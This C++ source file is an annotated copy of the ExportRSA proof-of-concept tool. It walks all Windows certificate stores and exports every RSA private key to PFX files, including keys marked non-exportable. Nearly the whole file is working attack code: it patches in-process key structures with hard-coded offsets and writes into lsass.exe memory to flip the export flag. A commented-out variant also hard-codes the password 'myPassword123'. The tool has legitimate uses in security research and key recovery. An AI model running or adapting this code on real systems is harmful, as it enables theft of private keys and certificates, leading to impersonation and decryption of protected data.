/*
This is free and unencumbered software released into the public domain.
Anyone is free to copy, modify, publish, use, compile, sell, or
distribute this software, either in source code form or as a compiled
binary, for any purpose, commercial or non-commercial, and by any
means.
In jurisdictions that recognize copyright laws, the author or authors
of this software dedicate any and all copyright interest in the
software to the public domain. We make this dedication for the benefit
of the public at large and to the detriment of our heirs and
successors. We intend this dedication to be an overt act of
relinquishment in perpetuity of all present and future rights to this
software under copyright law.
THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
IN NO EVENT SHALL THE AUTHORS BE LIABLE FOR ANY CLAIM, DAMAGES OR
OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE,
ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
OTHER DEALINGS IN THE SOFTWARE.
*/
/*
code inspired from the following paper:
https://www.nccgroup.trust/globalassets/our-research/uk/whitepapers/exporting_non-exportable_rsa_keys.pdf

ExportRSA v1.0
by Jason Geffner (jason.geffner@ngssecure.com)
This program enumerates all certificates in all system stores in all system
store locations and creates PFX files in the current directory for each
certificate found that has a local associated RSA private key. Each PFX file
created includes the ceritificate's private key, even if the private key was
marked as non-exportable.
For access to CNG RSA private keys, this program must be run with write-access
to the process that hosts the KeyIso service (the lsass.exe process). Either
modify the ACL on the target process, or run this program in the context of
SYSTEM with a tool such as PsExec.
This code performs little-to-no error-checking, does not free allocated memory,
and does not release handles. It is provided as proof-of-concept code with a
focus on simplicity and readability. As such, the code below in its current
form should not be used in a production environment.
This code was successfully tested on:
Windows 2000 (32-bit)
Windows XP (32-bit)
Windows Server 2003 (32-bit)
Windows Vista (32-bit)
Windows Mobile 6 (32-bit)
Windows Server 2008 (32-bit)
Windows 7 (32-bit, 64-bit)
Release History:
March 18, 2011 - v1.0 - First public release
*/
#include "stdafx.h" //Speed up compilation (precompiled header file)

#include <iostream> //input/output manipulation
#include <string> //strings manipulation

#include <Windows.h> //windows functions
#include <WinCrypt.h> //Certificate control lib
#include <stdio.h> //standart input/output

using namespace std; //using std namespace

#pragma comment(lib, "crypt32.lib") //search for crypt32 lib and include it
#ifndef WINCE
#pragma comment(lib, "ncrypt.lib") //search for ncrypt lib and include it
#endif
//These libraries contain functions for dealing with certificates

#ifndef CERT_NCRYPT_KEY_SPEC //if not defined
#define CERT_NCRYPT_KEY_SPEC 0xFFFFFFFF //define constant value which is used to specify the type of cryptographic key to use
#endif

//declare global variables
unsigned long g_ulFileNumber; 
BOOL g_fWow64Process;

wstring //string class for wide characters
getpass(
	const char *prompt,
	bool show_asterisk=true) //show_asterisk=* //just showing * or password in console + saving in password value
/*
getpass( char-pointer for prompt text, boolean flag if asterisk is returned)
returns wstring - object containting the password
"simple password input function that hides users input and returns it as a wide string object"
*/
{
	const char BACKSPACE=8; //define constant value for backspace
	const char RETURN=13; //define constant value for return key

	wstring password; //define object to hold the password
	unsigned char ch=0; //variable for reading each character of the password

	cout <<prompt << endl; //prints prompt to console

	DWORD con_mode; //define variable console mode
	DWORD dwRead; //

	HANDLE hIn=GetStdHandle(STD_INPUT_HANDLE); //HANDLE = not specificed type index 

	GetConsoleMode( hIn, &con_mode );
	SetConsoleMode( hIn, con_mode & ~(ENABLE_ECHO_INPUT | ENABLE_LINE_INPUT) );
    /*
    Gets console input handle, store current console input mode and disable echo input and
    line inpit for the console.
    => Characters entered by the user will not be displayed on the console and the user will not be 
    able to submit the input until the return key is pressed. 
    */

	while( ReadConsoleA( hIn, &ch, 1, &dwRead, NULL) && ch !=RETURN )
    /*
    enter a loop that reads input from the console until user presses the return key.
    Each character is stored in the ch variable.
    */
	{
		if(ch==BACKSPACE)
        /*
        if user press backspace -> remove the last character from password and update console display
        */
		{
			if(password.length()!=0)
			{
				if(show_asterisk)
					cout <<"\b \b";
				password.resize(password.length()-1);
			}
		}
		else
        /*
        If it is not backspace -> code appends character to the password and update display with an asterisk (if Flag is on) 
        */
		{
			password+=ch;
			if(show_asterisk)
				cout <<'*';
		}
	}
	cout <<endl; //ends a loop and prints a newline character to the console
	return password; //function returns a password as wstring object
}

/*
modified function to set static password
"""
// STATIC Password 
wstring getpass(const char *prompt, bool show_asterisk=true)
{
    // Set a static password
    static wstring password = L"myPassword123";

    // If the show_asterisk flag is false, return the password as-is
//   FUTURE: `modify to not return password on the console`
    if (!show_asterisk) {
        return password;
    }

    // If the show_asterisk flag is true, display the password with asterisks
//   FUTURE: `modify to not return password on the console`
    wstring maskedPassword;
    for (size_t i = 0; i < password.length(); i++) {
        maskedPassword += L'*';
    }
    return maskedPassword;
}
"""
*/

BOOL WINAPI
CertEnumSystemStoreCallback(
        const void* pvSystemStore,
        DWORD dwFlags,
        PCERT_SYSTEM_STORE_INFO pStoreInfo,
        void* pvReserved,
        void* pvArg)
/*

*/
{
    // Open a given certificate store
    HCERTSTORE hCertStore = CertOpenStore(
                CERT_STORE_PROV_SYSTEM,
                0,
                NULL,
                dwFlags | CERT_STORE_OPEN_EXISTING_FLAG | CERT_STORE_READONLY_FLAG,
                pvSystemStore);
    if (NULL == hCertStore)
    {
        //fprintf(stderr, "Cannot open cert store. Skip it: %X\n", GetLastError());
        //If certificate store canot be opened, skip it and return TRUE
        //That means the function will continue iterate over the remaining certificate stores
        return TRUE;
    }

    // Enumerate all certificates in the given store
    LPTSTR dwCertName = NULL;
    DWORD cbSize;

    for (PCCERT_CONTEXT pCertContext = CertEnumCertificatesInStore(hCertStore, NULL);
         NULL != pCertContext;
         pCertContext = CertEnumCertificatesInStore(hCertStore, pCertContext))
    {
        //free memory allocated for previous certificates name 
        if (dwCertName)
        {
            free(dwCertName);
        }

        //get the display name of current certificate
        if(!(cbSize = CertGetNameString(
            pCertContext,
            CERT_NAME_SIMPLE_DISPLAY_TYPE,
            0,
            NULL,
            NULL,
            0)))
        {
           fprintf(stderr, "CertGetName size failed.");
        }
        dwCertName = (LPTSTR)malloc(cbSize * sizeof(TCHAR));

        if(!CertGetNameString(
            pCertContext,
            CERT_NAME_SIMPLE_DISPLAY_TYPE,
            0,
            NULL,
            dwCertName,
            cbSize))
        {
            fprintf(stderr, "CertGetName failed.");
        }

        // Ensure that the certificate's public key is RSA
        if (strncmp(pCertContext->pCertInfo->SubjectPublicKeyInfo.Algorithm.pszObjId,
                    szOID_RSA,
                    strlen(szOID_RSA)))
        {
            //If the certificate does not have RSA public key, skip it and continues next certificate
            fprintf(stderr, "Skip cert with NO rsa public key for %S\n", dwCertName);
            continue;
        }

        // Ensure that the certificate's private key is available
        DWORD dwKeySpec;
        DWORD dwKeySpecSize = sizeof(dwKeySpec);
        if (!CertGetCertificateContextProperty(
                    pCertContext,
                    CERT_KEY_SPEC_PROP_ID,
                    &dwKeySpec,
                    &dwKeySpecSize))
        {
            //fprintf(stderr, "Skip cert with NO private key for %S: %x\n", dwCertName, GetLastError());
            //if certificate private key is not available, skip it and ccontinu with next certificate
            continue;
        }

        // Retrieve a handle to the certificate's private key's CSP key
        // container
        HCRYPTPROV hProv;
        HCRYPTPROV hProvTemp;
#ifdef WINCE
        HCRYPTPROV hCryptProvOrNCryptKey;
#else
        HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hCryptProvOrNCryptKey;
        NCRYPT_KEY_HANDLE hNKey;
#endif
        BOOL fCallerFreeProvOrNCryptKey;
        if (!CryptAcquireCertificatePrivateKey(
                    pCertContext,
                #ifdef WINCE
                    0,
                #else
                    CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG,
                #endif
                    NULL,
                    &hCryptProvOrNCryptKey,
                    &dwKeySpec,
                    &fCallerFreeProvOrNCryptKey))
        {
            fprintf(stderr, "Skip cert with NO private key handler for %S: %x\n", dwCertName, GetLastError());
            continue;
        }

        // do the job
        hProv = hCryptProvOrNCryptKey;
#ifndef WINCE
        hNKey = hCryptProvOrNCryptKey;
#endif
        HCRYPTKEY hKey;
        BYTE* pbData = NULL;
        DWORD cbData = 0;
        if (CERT_NCRYPT_KEY_SPEC != dwKeySpec)
        {
            // This code path is for CryptoAPI
            //fprintf(stdout, "Key for %S use CryptoAPI\n", dwCertName);

            // Retrieve a handle to the certificate's private key
            if (!CryptGetUserKey(
                        hProv,
                        dwKeySpec,
                        &hKey))
            {
                fprintf(stderr, "Cannot retrieve handle to the private key for %S\n", dwCertName);
                continue;
            }

            // check if private key is exportable
            if (!CryptExportKey(
                      hKey,
                      NULL,
                      PRIVATEKEYBLOB,
                      0,
                      NULL,
                      &cbData))
            {
                fprintf(stderr, "Private key for cert \"%S\" is not exportable: %x\n", dwCertName, GetLastError() );

                // Ask permission to the user to export cert
                fprintf(stdout, "Do you really want to export Public/private key for cert \"%S\"\n[Y|N] (default N) >>>> ", dwCertName );
                char response = ' ';
                cin.clear();
                cin.sync();
                cin.get(response);
                cin.clear();
                cin.sync();
                if ( response != 'Y' )
                {
                    fprintf(stdout, "Cert \"%S\" will be NOT exported\n\n", dwCertName );
                    continue;
                }

                // Mark the certificate's private key as exportable and archivable
                *(ULONG_PTR*)(*(ULONG_PTR*)(*(ULONG_PTR*)
                    #if defined(_M_X64)
                        (hKey + 0x58) ^ 0xE35A172CD96214A0) + 0x0C)
                    #elif (defined(_M_IX86) || defined(_ARM_))
                        (hKey + 0x2C) ^ 0xE35A172C) + 0x08)
                    #else
                        #error Platform not supported
                    #endif
                        |= CRYPT_EXPORTABLE | CRYPT_ARCHIVABLE;

                // Export the private key
                // first to retieve the lenght, then to retrieve data
                if (!CryptExportKey(
                          hKey,
                          NULL,
                          PRIVATEKEYBLOB,
                          0,
                          NULL,
                          &cbData))
                {
                    fprintf(stderr, "Not able to get private key lenght for cert \"%S\": %x\n", dwCertName, GetLastError() );
                    continue;
                }
            }
            pbData = (BYTE*)malloc(cbData);

            if (!CryptExportKey(
                      hKey,
                      NULL,
                      PRIVATEKEYBLOB,
                      0,
                      pbData,
                      &cbData))
            {
                fprintf(stderr, "Cannot export private key for for \"%S\": %x\n", dwCertName, GetLastError() );
                continue;
            }

            fprintf(stdout, "\nSUCCESSFULLY get private key for \"%S\"\n", dwCertName );

            // Establish a temporary key container
            //Create new private key container
            if (!CryptAcquireContext(
                        &hProvTemp,
                        NULL,
                        NULL,
                        PROV_RSA_FULL,
                        CRYPT_VERIFYCONTEXT | CRYPT_NEWKEYSET))
            {
                fprintf(stderr, "Cannot create temporary key container to store key for %S: %x\n", dwCertName, GetLastError() );
                continue;
            }
            // Import the private key into the temporary key container
            HCRYPTKEY hKeyNew;
            if (!CryptImportKey(
                        hProvTemp,
                        pbData,
                        cbData,
                        0,
                        CRYPT_EXPORTABLE,
                        &hKeyNew))
            {
                fprintf(stderr, "Cannot import key in temporary key container to store key for \"%S\": %x\n", dwCertName, GetLastError() );
                continue;
            }
        }
#ifndef WINCE
        else
        {
            fprintf(stdout, "Key for \"%S\" is a CNG key\n", dwCertName);

            // This code path is for CNG
            // Retrieve a handle to the Service Control Manager
            SC_HANDLE hSCManager = OpenSCManager(
                        NULL,
                        NULL,
                        SC_MANAGER_CONNECT);
            // Retrieve a handle to the KeyIso service
            SC_HANDLE hService = OpenService(
                        hSCManager,
                        L"KeyIso",
                        SERVICE_QUERY_STATUS);
            // Retrieve the status of the KeyIso process, including its Process
            // ID
            SERVICE_STATUS_PROCESS ssp;
            DWORD dwBytesNeeded;
            QueryServiceStatusEx(
                        hService,
                        SC_STATUS_PROCESS_INFO,
                        (BYTE*)&ssp,
                        sizeof(SERVICE_STATUS_PROCESS),
                        &dwBytesNeeded);
            // Open a read-write handle to the process hosting the KeyIso
            // service
            HANDLE hProcess = OpenProcess(
                        PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
                        FALSE,
                        ssp.dwProcessId);
            // Prepare the structure offsets for accessing the appropriate
            // field
            DWORD dwOffsetNKey;
            DWORD dwOffsetSrvKeyInLsass;
            DWORD dwOffsetKspKeyInLsass;
        #if defined(_M_X64)
            dwOffsetNKey = 0x10;
            dwOffsetSrvKeyInLsass = 0x28;
            dwOffsetKspKeyInLsass = 0x28;
        #elif defined(_M_IX86)
            dwOffsetNKey = 0x08;
            if (!g_fWow64Process)
            {
                dwOffsetSrvKeyInLsass = 0x18;
                dwOffsetKspKeyInLsass = 0x20;
            }
            else
            {
                dwOffsetSrvKeyInLsass = 0x28;
                dwOffsetKspKeyInLsass = 0x28;
            }
        #else
            // Platform not supported
            continue;
        #endif
            // Mark the certificate's private key as exportable
            DWORD pKspKeyInLsass;
            SIZE_T sizeBytes;
            ReadProcessMemory(
                        hProcess,
                        (void*)(*(SIZE_T*)*(DWORD*)(hNKey + dwOffsetNKey) +
                                dwOffsetSrvKeyInLsass),
                        &pKspKeyInLsass,
                        sizeof(DWORD),
                        &sizeBytes);
            unsigned char ucExportable;
            ReadProcessMemory(
                        hProcess,
                        (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                        &ucExportable,
                        sizeof(unsigned char),
                        &sizeBytes);
            ucExportable |= NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG;
            WriteProcessMemory(
                        hProcess,
                        (void*)(pKspKeyInLsass + dwOffsetKspKeyInLsass),
                        &ucExportable,
                        sizeof(unsigned char),
                        &sizeBytes);
            // Export the private key
            SECURITY_STATUS ss = NCryptExportKey(
                        hNKey,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        NULL,
                        0,
                        &cbData,
                        0);
            pbData = (BYTE*)malloc(cbData);
            ss = NCryptExportKey(
                        hNKey,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        pbData,
                        cbData,
                        &cbData,
                        0);
            // Establish a temporary CNG key store provider
            NCRYPT_PROV_HANDLE hProvider;
            NCryptOpenStorageProvider(
                        &hProvider,
                        MS_KEY_STORAGE_PROVIDER,
                        0);
            // Import the private key into the temporary storage provider
            NCRYPT_KEY_HANDLE hKeyNew;
            NCryptImportKey(
                        hProvider,
                        NULL,
                        LEGACY_RSAPRIVATE_BLOB,
                        NULL,
                        &hKeyNew,
                        pbData,
                        cbData,
                        0);
        }
#endif

        // ask for pwd to encrypt exported private key
        wstring password  = getpass("Enter password to protect exported cert: ",true); // Show asterisks
        wstring passwordCheck = getpass("Enter password again: ",true); // Show asterisks
        if( password != passwordCheck )
        {
            fprintf(stderr, "Password mismatch, SKIP exporting\n\n" );
            continue;
        }

        // Create a temporary certificate store in memory
        HCERTSTORE hMemoryStore = CertOpenStore(
                    CERT_STORE_PROV_MEMORY,
                    PKCS_7_ASN_ENCODING | X509_ASN_ENCODING,
                    NULL,
                    0,
                    NULL);

        // Add a link to the certificate to our tempoary certificate store
        PCCERT_CONTEXT pCertContextNew = NULL;
        CertAddCertificateLinkToStore(
                    hMemoryStore,
                    pCertContext,
                    CERT_STORE_ADD_NEW,
                    &pCertContextNew);

        // Set the key container for the linked certificate to be our temporary
        // key container
        CertSetCertificateContextProperty(
                    pCertContext,
            #ifdef WINCE
                    CERT_KEY_PROV_HANDLE_PROP_ID,
            #else
                    CERT_HCRYPTPROV_OR_NCRYPT_KEY_HANDLE_PROP_ID,
            #endif
                    0,
            #ifdef WINCE
                    (void*)hProvTemp);
            #else
                    (void*)((CERT_NCRYPT_KEY_SPEC == dwKeySpec) ?
                                hNKey : hProvTemp));
            #endif

        // Export the temporary certificate store to a PFX data blob in memory
        CRYPT_DATA_BLOB cdb;
        cdb.cbData = 0;
        cdb.pbData = NULL;
        PFXExportCertStoreEx(
                    hMemoryStore,
                    &cdb,
                    password.c_str(),
                    NULL,
                    EXPORT_PRIVATE_KEYS | REPORT_NO_PRIVATE_KEY
                    | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY);
        cdb.pbData = (BYTE*)malloc(cdb.cbData);

        PFXExportCertStoreEx(
                    hMemoryStore,
                    &cdb,
                    password.c_str(),
                    NULL,
                    EXPORT_PRIVATE_KEYS | REPORT_NO_PRIVATE_KEY
                    | REPORT_NOT_ABLE_TO_EXPORT_PRIVATE_KEY);

        // Prepare the PFX's file name
        wchar_t wszFileName[MAX_PATH];
        swprintf(   wszFileName,
                    L"%d.pfx",
                    g_ulFileNumber++);

        // Write the PFX data blob to disk
        HANDLE hFile = CreateFile(
                    wszFileName,
                    GENERIC_WRITE,
                    0,
                    NULL,
                    CREATE_ALWAYS,
                    0,
                    NULL);
        DWORD dwBytesWritten;

        WriteFile(  hFile,
                    cdb.pbData,
                    cdb.cbData,
                    &dwBytesWritten,
                    NULL);
        CloseHandle(hFile);

		fprintf(stdout, "SUCCESSFULLY exported cert bundle for \"%S\"in file \"%S\" \n\n", dwCertName, wszFileName );
    }
    return TRUE;
}

BOOL WINAPI
CertEnumSystemStoreLocationCallback(
        LPCWSTR pvszStoreLocations, //name of the system store location being enumerated
        DWORD dwFlags, //flags for enumerating the stores in the location
        void* pvReserved, //reserved for future use
        void* pvArg) //pointer to user-defined data
/*
Callback function that will be called for each system store location
*/
{
    // Enumerate all system stores in a given system store location
    CertEnumSystemStore(
                dwFlags, //flags for enumerating stores in the location
                NULL, //pointer to a certificate context. Parametr is ignored
                NULL, //pointer to a name of system store. Parametr is ignored
                CertEnumSystemStoreCallback); //pointer to a callback function to be called for eacg system store in tge location
/*
enumerate all the system soters in the given location.
return TRUE to indicate that it has finished enumerating and continue enumerating system store locations
*/
    return TRUE; //return TRUE to continue enumerating system store locations
}

int _tmain(int argc, _TCHAR* argv[])
{
    // Initialize g_ulFileNumber to 1
    g_ulFileNumber = 1;
    //Check if the current process is 32bit proccess running on 64bit OS
    // Determine if we're a 32-bit process running on a 64-bit OS
    g_fWow64Process = FALSE; //default value is FALSE
    BOOL (WINAPI* IsWow64Process)(HANDLE, PBOOL) =
            (BOOL (WINAPI*)(HANDLE, PBOOL))GetProcAddress(
                GetModuleHandle(L"kernel32.dll"), "IsWow64Process");
    /*
    load function isWiw64Process from the kernel32.dll library
    */
    if (NULL != IsWow64Process) //if function exists
    {
        IsWow64Process( GetCurrentProcess(),
                        &g_fWow64Process); //set g_fWow64Process to TRUE if running on a 64-bit OS
    }
    // Scan all system store locations
    CertEnumSystemStoreLocation(
                0,
                NULL,
                CertEnumSystemStoreLocationCallback);
    /*
    Call the CertEnumSystemStoreLocation function to enumerate all system store locations
    */

    return 0; //return 0 - success
}
